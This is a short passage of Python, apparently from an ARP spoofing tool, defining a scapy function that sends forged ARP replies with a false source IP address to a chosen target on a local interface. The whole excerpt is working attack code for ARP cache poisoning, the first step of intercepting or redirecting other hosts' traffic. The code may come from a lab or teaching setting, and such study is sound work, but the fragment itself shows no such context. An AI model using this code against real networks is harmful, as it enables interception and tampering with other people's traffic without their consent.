...
def sendFalseArpResponse( _interfaceName, _protocolDst, _hardwareDst, _falseProtocolSrc):
  frame= Ether()/ scapy.ARP( op= ArpResonseCode, pdst= _protocolDst, hwdst= _hardwareDst, psrc= _falseProtocolSrc)
  scapy.sendp( frame, iface= _interfaceName, verbose= False)    
